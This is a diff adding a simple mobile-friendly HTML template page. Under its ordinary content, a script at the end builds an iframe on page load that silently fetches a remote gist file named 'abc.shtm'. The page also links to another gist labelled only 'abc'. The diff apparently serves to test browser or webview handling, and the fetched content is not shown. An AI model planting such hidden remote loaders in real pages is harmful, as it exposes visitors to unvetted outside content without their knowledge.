@@ -1,0 +1,105 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+        }
+
+        header {
+            background-color: #333;
+            color: #fff;
+            padding: 10px;
+            text-align: center;
+        }
+
+        nav {
+            background-color: #444;
+            padding: 10px;
+            text-align: center;
+        }
+
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        section {
+            padding: 20px;
+            margin: 10px;
+            background-color: #fff;
+            border-radius: 5px;
+        }
+
+        footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Mobile Page</h1>
+    </header>
+
+    <a href="https://gist.githubusercontent.com/xweiwei/a52d43dd29e0cde8b8d86f3141875611/raw/1a92e0f66b537d77e907ed6a189e22a055e4ba7b/index.html"> abc </a>
+    
+
+    <nav>
+        <a href="#home">Home</a>
+        <a href="#about">About</a>
+        <a href="#contact">Contact</a>
+    </nav>
+
+    <section id="home">
+        <h2>Welcome to Our Mobile Page</h2>
+        <p>This is a simple example of a mobile-friendly webpage.</p>
+    </section>
+
+    <section id="about">
+        <h2>About Us</h2>
+        <p>We are a team dedicated to creating awesome mobile experiences.</p>
+    </section>
+
+    <section id="contact">
+        <h2>Contact Us</h2>
+        <p>You can reach us via email: contact@example.com</p>
+    </section>
+
+    <footer>
+        &copy; 2024 Mobile Page. All rights reserved.
+    </footer>
+
+
+
+
+<script>
+
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    // var force = "/abc.shtm";
+    var force = "https://gist.githubusercontent.com/xweiwei/f74fbacf727a7ec0c94d339af0a0e160/raw/a9b895f7879bc4f3b87a9de052aa4fe6fa69690d/abc.shtm"
+    var iFrame = document.createElement("iframe");
+    iFrame.src = force;
+    document.body.appendChild(iFrame);
+
+</script>
+
+</body>
+</html>
